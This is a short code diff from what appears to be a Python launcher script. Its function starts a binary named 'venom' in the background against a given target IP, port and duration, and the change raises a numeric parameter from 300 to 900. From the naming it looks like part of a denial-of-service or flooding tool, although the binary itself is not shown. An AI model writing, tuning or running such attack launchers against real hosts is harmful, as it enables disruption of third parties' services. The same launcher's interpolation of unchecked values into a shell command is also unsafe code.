@@ -44,7 +44,7 @@ def print_periodically():
 # ---------------------------
 def execute_own_vps_command(target_ip, target_port, duration):
     try:
-        command = f'nohup ./venom {target_ip} {target_port} {duration} 300 > /dev/null 2>&1 &'
+        command = f'nohup ./venom {target_ip} {target_port} {duration} 900 > /dev/null 2>&1 &'
         subprocess.Popen(command, shell=True)
         print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Executed on own VPS: {command}")
     except Exception as e:
